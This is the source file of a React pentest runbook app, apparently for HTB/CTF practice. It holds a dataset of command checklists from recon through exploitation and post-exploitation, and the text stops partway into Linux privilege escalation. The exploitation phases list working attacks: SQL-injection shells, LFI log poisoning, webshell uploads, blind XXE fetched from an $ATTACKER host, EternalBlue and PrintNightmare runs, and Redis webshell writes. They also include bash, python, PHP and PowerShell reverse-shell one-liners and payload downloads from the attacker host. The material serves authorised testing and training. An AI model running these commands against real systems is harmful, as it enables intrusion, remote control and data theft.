import { useState, useRef, useCallback, useEffect } from "react";

const TARGETS_STORAGE = "offsec-runbook-target-sessions-v1";
const TARGET_ONBOARDING_STORAGE = "offsec-runbook-target-onboarded-v1";
const ENGAGEMENT_NAME_STORAGE = "offsec-runbook-engagement-name-v1";
const ENGAGEMENT_SNAPSHOTS_STORAGE = "offsec-runbook-engagement-snapshots-v1";

function cmdCheckKey(phaseId, sectionId, techId, index) {
  return `${phaseId}|${sectionId}|${techId}|${index}`;
}

function createTargetSession(id, fallbackLabel, seed = {}) {
  return {
    id,
    fallbackLabel,
    nickname: seed.nickname || "",
    ip: seed.ip || "",
    activePhaseId: "recon",
    scanData: null,
    openPorts: [],
    visitedPhases: new Set(["recon"]),
    checkedCmds: new Set(),
    cmdNotes: {},
  };
}

function hydrateTargetSession(raw, fallbackLabel) {
  const safeFallback = typeof raw?.fallbackLabel === "string" && raw.fallbackLabel.trim()
    ? raw.fallbackLabel.trim()
    : (typeof raw?.name === "string" && raw.name.trim() ? raw.name.trim() : fallbackLabel);
  return {
    id: raw?.id || `target-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    fallbackLabel: safeFallback,
    nickname: typeof raw?.nickname === "string" ? raw.nickname.trim() : "",
    ip: typeof raw?.ip === "string" ? raw.ip.trim() : "",
    activePhaseId: typeof raw?.activePhaseId === "string" ? raw.activePhaseId : "recon",
    scanData: Array.isArray(raw?.scanData) ? raw.scanData : null,
    openPorts: Array.isArray(raw?.openPorts) ? raw.openPorts : [],
    visitedPhases: new Set(Array.isArray(raw?.visitedPhases) ? raw.visitedPhases : ["recon"]),
    checkedCmds: new Set(Array.isArray(raw?.checkedCmds) ? raw.checkedCmds : []),
    cmdNotes: raw?.cmdNotes && typeof raw.cmdNotes === "object" ? raw.cmdNotes : {},
  };
}

function isPlaceholderTarget(target) {
  return !target.nickname && !target.ip && !target.scanData
    && (!Array.isArray(target.openPorts) || target.openPorts.length === 0)
    && (!target.checkedCmds || target.checkedCmds.size === 0)
    && (!target.cmdNotes || Object.keys(target.cmdNotes).length === 0)
    && (!target.visitedPhases || (target.visitedPhases.size === 1 && target.visitedPhases.has("recon")))
    && target.activePhaseId === "recon";
}

function loadTargetSessions() {
  try {
    const raw = localStorage.getItem(TARGETS_STORAGE);
    if (!raw) return [createTargetSession("target-1", "Target 1")];
    const arr = JSON.parse(raw);
    if (!Array.isArray(arr) || !arr.length) return [createTargetSession("target-1", "Target 1")];
    const hydrated = arr.map((target, idx) => hydrateTargetSession(target, `Target ${idx + 1}`));
    const cleaned = hydrated.filter((target, idx) => idx === 0 || !isPlaceholderTarget(target));
    return cleaned.length ? cleaned : [createTargetSession("target-1", "Target 1")];
  } catch {
    return [createTargetSession("target-1", "Target 1")];
  }
}

function loadEngagementSnapshots() {
  try {
    const raw = localStorage.getItem(ENGAGEMENT_SNAPSHOTS_STORAGE);
    const arr = raw ? JSON.parse(raw) : [];
    return Array.isArray(arr) ? arr : [];
  } catch {
    return [];
  }
}

function countSectionProgress(phaseId, section, checkedCmds) {
  let total = 0;
  let done = 0;
  for (const tech of section.techniques) {
    tech.commands.forEach((cmd, i) => {
      if (cmd.trim().startsWith("#")) return;
      const key = cmdCheckKey(phaseId, section.id, tech.id, i);
      total++;
      if (checkedCmds.has(key)) done++;
    });
  }
  return { done, total };
}

function countPhaseProgress(phase, checkedCmds) {
  let done = 0;
  let total = 0;
  for (const sec of phase.sections) {
    const c = countSectionProgress(phase.id, sec, checkedCmds);
    done += c.done;
    total += c.total;
  }
  return { done, total };
}

// ═══════════════════════════════════════════════════════════════
// PORT → PHASE-2 NODE MAPPING
// ═══════════════════════════════════════════════════════════════
const PORT_MAP = {
  21:["ftp"], 22:["ssh"], 23:["telnet"], 25:["smtp"], 53:["dns"],
  80:["web"], 88:["kerberos"], 110:["pop3"], 111:["rpc"], 135:["rpc"],
  139:["smb"], 143:["imap"], 161:["snmp"], 389:["ldap"], 443:["web"],
  445:["smb"], 636:["ldap"], 873:["rsync"], 1433:["mssql"], 1521:["oracle"],
  2049:["nfs"], 3000:["web"], 3306:["mysql"], 3268:["ldap"], 3269:["ldap"],
  3389:["rdp"], 5432:["postgres"], 5900:["vnc"], 6379:["redis"],
  8000:["web"], 8080:["web"], 8443:["web"], 8888:["web"], 27017:["mongodb"],
};

// ═══════════════════════════════════════════════════════════════
// PHASE DATA
// ═══════════════════════════════════════════════════════════════
const PHASES = [
  {
    id: "recon", num: "01", label: "INITIAL RECON", shortLabel: "RECON",
    color: "#00d4ff", icon: "◎",
    tagline: "Know your target before it knows you're there.",
    description: "Systematic discovery of the attack surface. Start passive, escalate active. Every port matters — services you dismiss early become your foothold later.",
    nmapRelevant: true,
    sections: [
      {
        id: "passive", label: "Passive Reconnaissance", icon: "○",
        difficulty: "beginner", tip: "Do this before any active scanning. Leaves zero footprint on the target.",
        techniques: [
          { id: "osint", label: "OSINT & Public Footprint", tags: ["passive","web"],
            description: "Harvest publicly available information before touching the target network. DNS records, WHOIS, job postings, GitHub repos, and Shodan can all reveal infrastructure details.",
            commands: [
              "whois $TARGET",
              "dig ANY $TARGET @8.8.8.8",
              "theHarvester -d $DOMAIN -b google,linkedin,shodan",
              "shodan host $TARGET",
              "amass enum -passive -d $DOMAIN",
              "subfinder -d $DOMAIN -silent",
            ],
            resources: ["https://shodan.io", "https://crt.sh/?q=$DOMAIN", "https://www.whois.com"]
          },
          { id: "dns", label: "DNS Enumeration", tags: ["passive","infrastructure"],
            description: "DNS records often expose internal hostnames, mail servers, and subdomains. Zone transfers are rare but catastrophic when they work.",
            commands: [
              "dig axfr $DOMAIN @$TARGET  # zone transfer attempt",
              "dnsrecon -d $DOMAIN -t axfr",
              "dnsx -l subdomains.txt -a -cname -resp",
              "fierce --domain $DOMAIN",
              "gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            ]
          },
        ]
      },
      {
        id: "active", label: "Active Scanning", icon: "◉",
        difficulty: "beginner", tip: "Use -T2 or -T3 in production environments. -T4 is fine for HTB/CTF.",
        nmapSection: true,
        techniques: [
          { id: "portscan", label: "Port Discovery", tags: ["active","nmap"],
            description: "Always run a full port scan — default nmap only covers top 1000. Many HTB machines hide services on high ports. Run fast full-range first, then deep service scan on open ports.",
            commands: [
              "nmap -sV -sC -T4 -oA recon/initial $TARGET",
              "nmap -p- --min-rate=5000 -oA recon/allports $TARGET",
              "sudo nmap -sU --top-ports 200 -oA recon/udp $TARGET",
              "nmap -p$(cat recon/allports.gnmap | grep '/open' | grep -oP '\\d+/open' | cut -d/ -f1 | tr '\\n' ',') -sV -sC -oA recon/targeted $TARGET",
            ]
          },
          { id: "webdisc", label: "Web Discovery", tags: ["active","web"],
            description: "Virtual host routing is common — always test with the hostname, not just the IP. Check for HTTPS alongside HTTP.",
            commands: [
              "gobuster vhost -u http://$TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
              "ffuf -u http://$TARGET -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302",
              "whatweb -a 3 http://$TARGET",
              "curl -sk https://$TARGET -o /dev/null -w '%{http_code}'",
            ]
          },
          { id: "netmap", label: "Network Mapping", tags: ["active","infrastructure"],
            description: "Map out the network topology. Identify live hosts, gateways, and potential pivot points before you even have a foothold.",
            commands: [
              "nmap -sn 10.10.10.0/24 -oA recon/sweep",
              "arp-scan --localnet",
              "netdiscover -r 10.10.10.0/24",
              "masscan -p1-65535 $TARGET --rate=10000",
            ]
          },
        ]
      },
    ]
  },

  {
    id: "vulnid", label: "VULN IDENTIFICATION", shortLabel: "VULN ID",
    num: "02", color: "#a855f7", icon: "◈",
    tagline: "Map the attack surface. Find the cracks.",
    description: "Enumerate each discovered service in depth. The goal is to identify misconfigurations, outdated software, weak credentials, and known CVEs before attempting exploitation.",
    nmapRelevant: true,
    sections: [
      {
        id: "web_enum", label: "Web Enumeration", icon: "◉",
        portTrigger: ["web"], difficulty: "intermediate",
        tip: "Always check robots.txt, sitemap.xml, and /.well-known/ first. Then fuzz hard.",
        techniques: [
          { id: "web_dir", label: "Directory & File Fuzzing", tags: ["web","fuzzing"],
            description: "Automated directory brute-forcing reveals hidden admin panels, backup files, and API endpoints. Run multiple wordlists — what feroxbuster misses, ffuf often finds.",
            commands: [
              "gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,conf -t 40",
              "feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --smart-links",
              "ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,201,301,302,403",
              "curl http://$TARGET/robots.txt && curl http://$TARGET/sitemap.xml",
              "nikto -h http://$TARGET -output recon/nikto.txt",
            ]
          },
          { id: "web_tech", label: "Tech Stack Fingerprinting", tags: ["web","fingerprint"],
            description: "Identify frameworks, CMS platforms, and server software. Version numbers are gold — search them directly on ExploitDB and GitHub.",
            commands: [
              "whatweb -a 3 -v http://$TARGET",
              "wappalyzer http://$TARGET  # browser extension or CLI",
              "curl -I http://$TARGET | grep -i 'server\\|x-powered\\|set-cookie'",
              "wpscan --url http://$TARGET --enumerate vp,vt,u --api-token $WPSCAN_TOKEN",
              "joomscan -u http://$TARGET",
              "droopescan scan -u http://$TARGET",
            ]
          },
          { id: "web_params", label: "Parameter & Input Discovery", tags: ["web","fuzzing"],
            description: "Find hidden parameters, test for injection points. Arjun excels at parameter discovery. Then feed found params into sqlmap, dalfox, etc.",
            commands: [
              "arjun -u http://$TARGET/page -m GET",
              "ffuf -u 'http://$TARGET/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
              "sqlmap -u 'http://$TARGET/page?id=1' --dbs --batch --level=2",
              "dalfox url http://$TARGET/search?q=test  # XSS scanner",
            ]
          },
          { id: "web_auth", label: "Authentication Testing", tags: ["web","auth"],
            description: "Test login forms for default credentials, username enumeration via timing/response differences, and password policies. Check for OAuth misconfigs if SSO is present.",
            commands: [
              "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
              "medusa -h $TARGET -U users.txt -P passwords.txt -M http -m DIR:/login -m FORM:user=^USER^&pass=^PASS^",
              "ffuf -w users.txt -u http://$TARGET/login -X POST -d 'username=FUZZ&password=wrong' -fr 'invalid\\|unknown\\|incorrect' -mc all -t 40",
              "curl -s -o /dev/null -w '%{time_total}\\t%{size_download}\\n' -d 'user=admin&pass=wrong' http://$TARGET/login",
              "curl -s -o /dev/null -w '%{time_total}\\t%{size_download}\\n' -d 'user=nope999&pass=wrong' http://$TARGET/login",
            ]
          },
        ]
      },
      {
        id: "smb_enum", label: "SMB Enumeration", icon: "◉",
        portTrigger: ["smb"], difficulty: "beginner",
        tip: "Always try null/anonymous sessions first. You'd be amazed how often they work.",
        techniques: [
          { id: "smb_null", label: "Null Session & Share Enum", tags: ["smb","auth"],
            description: "Unauthenticated SMB enumeration can reveal usernames, shares, domain info, and password policies. enum4linux-ng is the modern, comprehensive tool.",
            commands: [
              "enum4linux-ng -A $TARGET -oA recon/smb_enum",
              "smbclient -L //$TARGET -N",
              "smbmap -H $TARGET -u '' -p ''",
              "crackmapexec smb $TARGET --shares -u '' -p ''",
              "nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 $TARGET",
            ]
          },
          { id: "smb_vuln", label: "SMB Vulnerability Scanning", tags: ["smb","cve"],
            description: "Check for critical SMB vulns: MS17-010 (EternalBlue), MS08-067, PrintNightmare (CVE-2021-1675). Always verify before exploiting.",
            commands: [
              "nmap --script smb-vuln* -p 445 $TARGET",
              "crackmapexec smb $TARGET --gen-relay-list relay_targets.txt",
              "# MS17-010 check:",
              "python3 /opt/MS17-010/checker.py $TARGET",
              "# PrintNightmare check:",
              "rpcdump.py @$TARGET | grep -i 'MS-RPRN\\|MS-PAR'",
            ]
          },
        ]
      },
      {
        id: "ad_enum", label: "Active Directory Enumeration", icon: "◉",
        portTrigger: ["ldap","kerberos"], difficulty: "advanced",
        platformHint: "windows",
        tip: "BloodHound is non-negotiable for AD. Run it early and let it run in the background.",
        techniques: [
          { id: "ldap_enum", label: "LDAP / Domain Enumeration", tags: ["ldap","active-directory"],
            description: "Enumerate users, groups, computers, GPOs, and trust relationships. Anonymous LDAP bind may expose the entire directory without credentials.",
            commands: [
              "ldapsearch -x -H ldap://$TARGET -b 'dc=domain,dc=com'",
              "ldapsearch -x -H ldap://$TARGET -b 'dc=domain,dc=com' '(objectClass=user)' sAMAccountName",
              "windapsearch.py --dc-ip $TARGET -U  # enumerate users",
              "GetADUsers.py -all -dc-ip $TARGET domain/user:pass",
              "enum4linux-ng -A $TARGET -u user -p pass",
            ]
          },
          { id: "bloodhound", label: "BloodHound Collection", tags: ["active-directory","graph"],
            description: "BloodHound visualises attack paths through AD. SharpHound collects the data; BloodHound shows you shortest paths to DA. Always check 'Shortest Paths to Domain Admins'.",
            commands: [
              "bloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $TARGET -c all",
              "# Collect from Windows host:",
              ".\\SharpHound.exe -c All --zipfilename loot.zip",
              "sudo neo4j start && ss -tlnp | grep -E '7474|7687'",
              "bloodhound --no-sandbox  # BloodHound CE GUI → Upload loot.zip → Shortest Paths to Domain Admins",
            ]
          },
          { id: "kerberos_attacks", label: "Kerberos Pre-exploitation", tags: ["kerberos","active-directory"],
            description: "AS-REP Roasting targets accounts with pre-auth disabled. Kerberoasting requests service tickets for SPNs — both yield offline-crackable hashes.",
            commands: [
              "# AS-REP Roasting (no creds needed):",
              "GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $TARGET -no-pass -request",
              "# Kerberoasting (creds needed):",
              "GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $TARGET -request -outputfile kerberoast_hashes.txt",
              "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt  # AS-REP",
              "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt  # TGS",
            ]
          },
        ]
      },
      {
        id: "service_enum", label: "Service-Specific Enumeration", icon: "◉",
        portTrigger: ["ssh","ftp","smtp","snmp","mysql","mssql","redis","mongodb","nfs","rdp"], difficulty: "beginner",
        tip: "Default credentials work far more often than they should. Always try them.",
        techniques: [
          { id: "ssh_enum", label: "SSH", tags: ["ssh"],
            description: "Banner grab for version, check for weak keys, test username enumeration (CVE-2018-15473 on old versions). Brute-force as last resort — it's noisy.",
            commands: [
              "nc $TARGET 22  # grab banner",
              "ssh-audit $TARGET",
              "crackmapexec ssh $TARGET -u users.txt -p passwords.txt --continue-on-success",
              "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -V",
            ]
          },
          { id: "ftp_enum", label: "FTP", tags: ["ftp"],
            description: "Anonymous FTP login is the first check. List all files recursively — configs, backups, and credentials hide in unexpected places.",
            commands: [
              "ftp $TARGET  # user: anonymous  pass: anything",
              "nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 $TARGET",
              "wget -r ftp://$TARGET/ --no-passive-ftp  # recursive download if anonymous",
              "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$TARGET",
            ]
          },
          { id: "snmp_enum", label: "SNMP", tags: ["snmp"],
            description: "SNMP v1/v2c uses community strings (often 'public'). A readable community string leaks the full system MIB — users, processes, interfaces, routing tables.",
            commands: [
              "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET",
              "snmpwalk -c public -v1 $TARGET",
              "snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25  # Windows user list",
              "snmp-check $TARGET -c public -v 1",
            ]
          },
          { id: "db_enum", label: "Databases (MySQL / MSSQL / PostgreSQL)", tags: ["mysql","mssql","postgres"],
            description: "Databases exposed to the network often run with default or blank credentials. MSSQL xp_cmdshell and PostgreSQL COPY TO can lead directly to RCE.",
            commands: [
              "mysql -h $TARGET -u root -p  # try blank/root/toor",
              "mssqlclient.py sa@$TARGET -windows-auth",
              "crackmapexec mssql $TARGET -u sa -p '' --local-auth",
              "psql -h $TARGET -U postgres",
              "redis-cli -h $TARGET  # no auth check: 'info'",
              "mongo --host $TARGET --eval 'db.adminCommand({listDatabases:1})'",
            ]
          },
          { id: "nfs_enum", label: "NFS / RPC", tags: ["nfs","rpc"],
            platformHint: "linux",
            description: "NFS exports with no_root_squash are critical — you can create SUID root binaries. Always check what's mounted and with what options.",
            commands: [
              "showmount -e $TARGET",
              "rpcinfo -p $TARGET",
              "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 $TARGET",
              "mount -t nfs $TARGET:/share /mnt/nfs && ls -la /mnt/nfs",
              "cat /proc/filesystems | grep nfs",
            ]
          },
        ]
      },
    ]
  },

  {
    id: "exploitation", label: "EXPLOITATION", shortLabel: "EXPLOIT",
    num: "03", color: "#ff3366", icon: "◆",
    tagline: "Controlled, targeted, and documented.",
    description: "Execute exploits against confirmed vulnerabilities. Always understand what your exploit does before running it. Document the exact command, timestamp, and result. One working exploit is worth more than ten half-tested ones.",
    sections: [
      {
        id: "web_exploit", label: "Web Application Exploits", icon: "◉",
        difficulty: "intermediate", portTrigger: ["web"],
        tip: "Get Burp Suite Community running before you start — you'll want to catch every request.",
        techniques: [
          { id: "sqli_exploit", label: "SQL Injection → RCE", tags: ["web","sqli","rce"],
            description: "SQLi ranges from data extraction to full OS command execution. Manual confirmation first, then automate. MySQL FILE priv → webshell. MSSQL xp_cmdshell → direct OS exec.",
            commands: [
              "# Manual test first:",
              "curl 'http://$TARGET/page?id=1 AND 1=1--'",
              "curl 'http://$TARGET/page?id=1 AND 1=2--'",
              "# Automated:",
              "sqlmap -u 'http://$TARGET/page?id=1' --dbs --batch",
              "sqlmap -r request.txt --level=5 --risk=3 --dbs",
              "# MySQL webshell drop:",
              "sqlmap -r request.txt --os-shell",
              "# MSSQL RCE:",
              "sqlmap -r request.txt --sql-query=\"EXEC xp_cmdshell('whoami')\"",
            ],
            severity: "critical"
          },
          { id: "lfi_exploit", label: "LFI → RCE Escalation", tags: ["web","lfi","rce"],
            description: "File inclusion can escalate to RCE via log poisoning, /proc/self/environ injection, or PHP filter chains. The filter chain technique works even when you can't write files.",
            commands: [
              "# Basic LFI check:",
              "curl 'http://$TARGET/page?file=../../../../etc/passwd'",
              "curl 'http://$TARGET/page?file=../../../../etc/shadow'  # if lucky",
              "# PHP filter (read source):",
              "curl 'http://$TARGET/page?file=php://filter/convert.base64-encode/resource=index.php'",
              "# Log poisoning via SSH:",
              "ssh '<?php system($_GET[\"cmd\"]); ?>'@$TARGET",
              "curl 'http://$TARGET/page?file=/var/log/auth.log&cmd=id'",
              "# Log poisoning via Apache:",
              "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://$TARGET/",
              "curl 'http://$TARGET/page?file=/var/log/apache2/access.log&cmd=whoami'",
              "# PHP filter chain RCE (no file write needed):",
              "python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"cmd\"]);?>'",
            ],
            severity: "high"
          },
          { id: "rce_exploit", label: "Remote Code Execution", tags: ["web","rce"],
            description: "Direct RCE via command injection, SSTI, deserialization, or file upload. Test every input that touches the OS. SSTI in Jinja2, Twig, Freemarker all have distinct payloads.",
            commands: [
              "# Command injection:",
              "curl 'http://$TARGET/ping?host=127.0.0.1;id'",
              "curl 'http://$TARGET/ping?host=127.0.0.1|whoami'",
              "# SSTI detection:",
              "curl 'http://$TARGET/page?name={{7*7}}'  # Jinja2/Twig - look for 49",
              "curl 'http://$TARGET/page?name=${7*7}'   # Freemarker/Thymeleaf",
              "# File upload → webshell:",
              "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
              "curl -F 'file=@shell.php' http://$TARGET/upload",
              "curl http://$TARGET/uploads/shell.php?cmd=id",
            ],
            severity: "critical"
          },
          { id: "ssrf_exploit", label: "SSRF & XXE", tags: ["web","ssrf","xxe"],
            description: "SSRF pivots through the server to reach internal services. XXE reads local files or triggers SSRF via external DTD. Both can chain to credentials or RCE.",
            commands: [
              "# SSRF to internal services:",
              "curl 'http://$TARGET/fetch?url=http://127.0.0.1:8080/admin'",
              "curl 'http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/'",
              "curl 'http://$TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'  # Azure IMDS",
              "# XXE file read — tune URL/body field name to app:",
              "curl -sk -X POST 'http://$TARGET/api' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY z SYSTEM \"file:///etc/passwd\">]><data>&z;</data>'",
              "# Blind XXE — host evil.dtd on attacker (parameter entities), then:",
              "curl -sk -X POST 'http://$TARGET/api' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % r SYSTEM \"http://$ATTACKER/evil.dtd\">%r;]><x/>'",
            ],
            severity: "high"
          },
        ]
      },
      {
        id: "network_exploit", label: "Network Service Exploits", icon: "◉",
        difficulty: "intermediate",
        tip: "Use searchsploit AND Metasploit — sometimes one has a better PoC than the other.",
        techniques: [
          { id: "smb_exploit_run", label: "SMB Exploitation", tags: ["smb","cve"],
            platformHint: "mixed",
            description: "EternalBlue (MS17-010) is reliable on unpatched Windows 7/2008. PrintNightmare affects fully-patched systems. Always verify the target is vulnerable before running the exploit.",
            commands: [
              "# EternalBlue:",
              "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set LHOST $ATTACKER; run'",
              "# Manual PoC:",
              "python3 zzz_exploit.py $TARGET $PIPE",
              "# PrintNightmare:",
              "python3 CVE-2021-1675.py $DOMAIN/$USER:$PASS@$TARGET '\\\\$ATTACKER\\share\\shell.dll'",
              "# SambaCry (Linux Samba < 4.5.9):",
              "python3 sambacry.py $TARGET /share .$PAYLOAD.so",
            ],
            severity: "critical"
          },
          { id: "cve_search", label: "CVE Research & ExploitDB", tags: ["cve","research"],
            description: "Every service version is a potential CVE. searchsploit is fast for offline search; exploit.db and GitHub for PoCs. Always read the exploit before running it.",
            commands: [
              "searchsploit 'apache 2.4.49'",
              "searchsploit -x exploits/linux/webapps/50383.py  # examine before use",
              "searchsploit -m exploits/linux/webapps/50383.py  # copy to cwd",
              "# Search by CVE:",
              "searchsploit --cve CVE-2021-41773",
              "gh search repos CVE-2021-41773 poc --sort stars --limit 10",
            ],
            severity: "varies"
          },
          { id: "db_exploit_run", label: "Database → Shell", tags: ["mysql","mssql","rce"],
            description: "Database RCE via built-in functions. MySQL UDF injection, MSSQL xp_cmdshell, PostgreSQL COPY TO/FROM program — all yield OS command execution.",
            commands: [
              "# MSSQL — enable xp_cmdshell:",
              "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
              "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
              "EXEC xp_cmdshell 'whoami';",
              "# MySQL UDF:",
              "msfconsole -x 'use exploit/multi/mysql/mysql_udf_payload; set RHOSTS $TARGET; run'",
              "# PostgreSQL:",
              "psql -h $TARGET -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id > /tmp/out'\"",
              "# Redis → webshell:",
              "redis-cli -h $TARGET SET shell '<?php system($_GET[\"cmd\"]); ?>'",
              "redis-cli -h $TARGET CONFIG SET dir /var/www/html",
              "redis-cli -h $TARGET CONFIG SET dbfilename shell.php",
              "redis-cli -h $TARGET SAVE",
            ],
            severity: "critical"
          },
        ]
      },
      {
        id: "revshell", label: "Reverse Shell Delivery", icon: "◉",
        difficulty: "beginner",
        tip: "revshells.com generates every shell variant. Use pwncat-cs instead of nc — it auto-stabilises.",
        techniques: [
          { id: "rev_shells", label: "Reverse Shell One-liners", tags: ["shell","rce"],
            description: "Get a shell back to your listener. Start with bash, fall back to python, then perl/php. Always URL-encode if delivering via URL parameter.",
            commands: [
              "# Listener (use pwncat-cs for auto-upgrade):",
              "pwncat-cs -lp 4444",
              "# OR classic netcat:",
              "nc -nlvp 4444",
              "# Bash:",
              "bash -i >& /dev/tcp/$ATTACKER/4444 0>&1",
              "# Python3:",
              "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
              "# PHP:",
              "php -r '$s=fsockopen(\"$ATTACKER\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
              "# PowerShell (Windows):",
              "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            ]
          },
          { id: "shell_upgrade", label: "Shell Stabilisation & Upgrade", tags: ["shell","post-access"],
            platformHint: "linux",
            description: "Dumb shells are painful — no tab completion, ctrl+c kills your session. Stabilise immediately. pwncat-cs handles this automatically.",
            commands: [
              "# Python PTY (most reliable):",
              "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
              "# Then background with Ctrl+Z, then:",
              "stty raw -echo; fg",
              "export TERM=xterm-256color",
              "stty rows 50 cols 200",
              "# Alternative — script:",
              "script /dev/null -c bash",
              "# socat (best quality shell):",
              "# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444",
              "# Target:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER:4444",
            ]
          },
          { id: "file_transfer", label: "File Transfer Techniques", tags: ["shell","utility"],
            description: "Get tools onto the target. Multiple methods because firewalls and AV block different vectors. Always verify file integrity after transfer.",
            commands: [
              "# HTTP server (attacker):",
              "python3 -m http.server 80",
              "# wget / curl (target):",
              "wget http://$ATTACKER/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh",
              "curl -so /tmp/tool http://$ATTACKER/tool && chmod +x /tmp/tool",
              "# SMB share (Windows targets):",
              "impacket-smbserver share . -smb2support -username x -password x",
              "# From Windows: copy \\\\$ATTACKER\\share\\tool.exe C:\\Windows\\Temp\\",
              "# Base64 encode/decode (no outbound needed):",
              "base64 -w0 tool  # attacker — copy output",
              "echo 'BASE64DATA' | base64 -d > /tmp/tool && chmod +x /tmp/tool",
            ]
          },
        ]
      },
    ]
  },

  {
    id: "postex", label: "POST-EXPLOITATION", shortLabel: "POST-EX",
    num: "04", color: "#f97316", icon: "◉",
    tagline: "You're in. Now own it completely.",
    description: "Establish persistence, escalate privileges, and harvest everything of value. Methodical post-exploitation separates a quality engagement report from a checkbox exercise.",
    sections: [
      {
        id: "localrecon", label: "Local Enumeration", icon: "○",
        difficulty: "beginner",
        tip: "Run automated tools first, then go manual. Automated tools miss context-specific misconfigs.",
        techniques: [
          { id: "linux_enum", label: "Linux Enumeration", tags: ["linux","privesc"],
            platformHint: "linux",
            description: "Thorough local enumeration before attempting privesc. LinPEAS is comprehensive but noisy — understand what it's doing. Manual checks often find what automated tools miss.",
            commands: [
              "# Transfer and run LinPEAS:",
              "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
              "# Manual essentials:",
              "id && whoami && hostname",
              "cat /etc/passwd | grep -v nologin",
              "sudo -l",
              "find / -perm -4000 -type f 2>/dev/null  # SUID",
              "find / -perm -2000 -type f 2>/dev/null  # SGID",
              "cat /etc/crontab && ls -la /etc/cron*",
              "env && cat ~/.bashrc ~/.bash_history 2>/dev/null",
              "ss -tlnp && netstat -tulpn 2>/dev/null  # internal services",
              "find / -writable -type f 2>/dev/null | grep -v proc",
              "ls -la /opt /srv /var/www 2>/dev/null",
            ]
          },
          { id: "win_enum", label: "Windows Enumeration", tags: ["windows","privesc"],
            platformHint: "windows",
            description: "WinPEAS automates most checks. Manual focus on token privileges, service misconfigs, and AlwaysInstallElevated. Check for unquoted service paths — common in enterprise.",
            commands: [
              ".\\winPEASx64.exe > winpeas_out.txt",
              "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"",
              "whoami /all  # privileges and groups",
              "net user && net localgroup administrators",
              "systeminfo | findstr /i 'os name\\|hotfix'",
              "wmic service get name,pathname,startmode | findstr /iv 'c:\\windows'",
              "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
              "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
              "schtasks /query /fo LIST /v | findstr /i 'task name\\|run as\\|schedule'",
              "cmdkey /list  # saved credentials",
            ]
          },
        ]
      },
      {
        id: "privesc", label: "Privilege Escalation", icon: "◆",
        difficulty: "advanced",
        tip: "GTFOBins (Linux) and LOLBAS (Windows) are your bibles. Bookmark them.",
        techniques: [
          { id: "linux_privesc", label: "Linux PrivEsc Techniques", tags: ["linux","privesc","root"],
            platformHint: "linux",
            description: "Work through vectors systematically: sudo misconfig → SUID abuse → writable cron → PATH hijack → kernel exploit. Always least-impactful first.",
            commands: [
              "# Sudo abuse — check GTFOBins for each binary:",
              "sudo -l",
              "sudo find . -exec /bin/bash \\; -quit",
              "sudo vim -c ':!bash'",
              "# SUID exploitation:",
              "find / -perm -u=s -type f 2>/dev/null",
              "# Writable cron scripts:",
